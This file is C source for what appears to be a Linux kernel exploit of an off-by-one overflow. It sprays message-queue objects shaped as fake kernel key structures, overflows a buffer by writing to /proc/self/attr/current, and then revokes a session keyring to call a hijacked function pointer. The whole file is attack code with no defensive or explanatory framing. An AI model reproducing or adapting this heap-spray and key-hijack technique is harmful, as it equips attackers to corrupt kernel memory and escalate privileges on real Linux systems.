/*
 * off-by-one + stuct key
 */


#include <stdio.h>
#include <linux/netlink.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>
#include <string.h>
#include <arpa/inet.h>
#include <linux/in.h>
#include <linux/xfrm.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <strings.h>
#include <unistd.h>
#include <asm/unistd.h>
#include <poll.h>
#include <pthread.h>
#include <stdint.h>
#include <stddef.h>
#include <sys/types.h>
#include <keyutils.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <linux/keyctl.h>

#define MAX_PAYLOAD 4096
#define BUFF_SIZE  184
#define STRUCT_LEN_KEY (BUFF_SIZE - 0x30)
#define BASE_MSGTYPE 0x4141414141414141
#define NUM_MSG 9

struct msgbuf_key { 
	long mtype;
	char mtext[STRUCT_LEN_KEY];
};
struct msgbuf_key msg_key = {BASE_MSGTYPE, {0}};
int msqid;

struct ip_auth_hdr {
	__u8	nexthdr;
	__u8	hdrlen;
	__be16	reserved;	/* big endian */
	__be32	spi;		/* big endian */
	__be32	seq_no;		/* big endian */
	__u8	auth_data[8];
};




struct key_type {
    char * name;
    size_t datalen;
    void * vet_description;
    void * preparse;
    void * free_preparse;
    void * instantiate;
    void * update;
    void * match_preparse;
    void * match_free;
    void * revoke;
    void * destroy;
};
struct key_type my_key_type;

struct key_security_struct {
	unsigned int sid;	/* SID of key */
};
struct key_security_struct ksec;

void sendmymsg(int start, int num) {
	int i;
	size_t size;
	void *x;
    for (i = start; i < start+num; i++) {
    	msg_key.mtype = BASE_MSGTYPE + i;
		
    	if (i >= 64) {
    		perror("too much");
    		exit(1);
    	}
		//memset(msg_key.mtext, 0x42, STRUCT_LEN_KEY-1);
        if (msgsnd(msqid, &msg_key, sizeof(msg_key.mtext), 0) == -1) {
            perror("msgsnd");
            exit(1);
        }
    }
}

void recvmymsg(int index) {
	struct msgbuf_key msg_rcv;
	if (msgrcv(msqid, (void *) &msg_rcv, sizeof(msg_rcv.mtext), BASE_MSGTYPE+index,
				MSG_NOERROR | IPC_NOWAIT) == -1) {
		if(errno != ENOMSG) {
			perror("msgrcv");
			exit(1);
		}
	}
	else {
		//printf("message received: %s\n", msg.mtext);
	}
	return;
}

void fork_and_spray(int num) {
	int i;
	pid_t pid = -1;
	for (i = 0; i < num; i++) {
		pid = fork();
		if (pid == -1) {
			perror("fork");
			exit(0);
		}
		if (pid == 0) {
			if ((msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {
		        perror("msgget");
		        exit(1);
		    }

			// sleep(4);
			sendmymsg(0, 64);
			pause();
			//exit(0);
		}
	}
}

int main(int argc, char const *argv[])
{ 
    int bmp_len  = (BUFF_SIZE - 0x18) / 4;
    int window = ((bmp_len + 2) * 32) + 1;
    int seq = 0xb40;
    int seq_hi = 1;
    
	ksec.sid = 1;
	*(unsigned long*)(&msg_key.mtext[32]) = &ksec;
    *(int*)(&msg_key.mtext[56]) = 0x3e8;
    *(int*)(&msg_key.mtext[72]) = 0x9;
    *(int*)(&msg_key.mtext[40]) = 0x0;
    //key->perm
    *(int*)(&msg_key.mtext[64]) = 0x3f3f3f3f;
    //*(unsigned long*)(&msg_key.mtext[0x78-0x30])=1;
	my_key_type.revoke = 0xdeadbeefcafebabe;
	*(unsigned long*)(&msg_key.mtext[0x80-0x30]) = &my_key_type;
    
	unsigned int time = 1;
	fork_and_spray(5);
	sleep(5);
	
	if ((msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {
        perror("msgget");
        exit(1);
    }
    sendmymsg(0, NUM_MSG);

	recvmymsg(NUM_MSG - 1);
	recvmymsg(NUM_MSG - 3);

    key_serial_t serial;
	serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, "keyring");
    if (serial < 0) {
        perror("keyctl");
        return -1;
    }
    if (keyctl(KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL | KEY_GRP_ALL | KEY_OTH_ALL) < 0) {
        perror("keyctl");
        return -1;
    }
    
    recvmymsg(NUM_MSG - 2);

    char buf[192];
    memset(buf, 'A', 192);
    int fd = open("/proc/self/attr/current", O_RDWR);
	write(fd, buf, 192);
	
	serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, "keyring");
    if (serial < 0) {
        perror("keyctl");
        return -1;
    }
	sleep(3);

	//sendmymsg(NUM_MSG, 64-NUM_MSG);
	sendmymsg(NUM_MSG, 64-NUM_MSG);
	if (keyctl(KEYCTL_REVOKE, KEY_SPEC_SESSION_KEYRING) == -1) {
        perror("keyctl_revoke");
    }
}
